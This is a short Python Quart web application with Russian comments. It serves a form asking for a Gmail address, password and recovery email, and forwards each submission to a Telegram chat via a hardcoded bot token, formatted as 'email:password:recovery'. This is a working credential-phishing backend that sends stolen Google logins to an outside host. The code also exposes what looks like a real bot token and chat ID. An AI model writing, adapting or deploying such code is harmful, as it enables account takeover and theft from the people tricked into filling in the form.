from quart import Quart, render_template, request
from aiogram import Bot
import asyncio

# Инициализация Quart
app = Quart(__name__)

# Токен Telegram-бота (замени на свой от @BotFather)
TELEGRAM_TOKEN = "7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54"
CHAT_ID = "1361079299"  # ID чата, куда отправлять сообщения (узнай через @getmyid_bot)

# Инициализация Telegram-бота
telegram_bot = Bot(token=TELEGRAM_TOKEN)

# Асинхронная функция для отправки сообщения в Telegram
async def send_telegram_message(text):
    await telegram_bot.send_message(chat_id=CHAT_ID, text=text)

# Маршрут для отображения формы (асинхронный)
@app.route('/', methods=['GET'])
async def show_form():
    return await render_template('form.html')

# Маршрут для обработки отправки формы (асинхронный)
@app.route('/submit', methods=['POST'])
async def submit_form():
    # Получаем данные из формы (асинхронно)
    form = await request.form
    gmail = form['gmail']
    password = form['password']
    recovery_email = form['recovery_email']
    
    # Формируем сообщение для Telegram
    message = f"\n{gmail}:{password}:{recovery_email}"
    
    # Отправляем сообщение в Telegram (асинхронно)
    await send_telegram_message(message)
    
    # Отображаем страницу успеха
    return await render_template('success.html', 
                                gmail=gmail, 
                                password=password, 
                                recovery_email=recovery_email)

# Запуск Quart
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
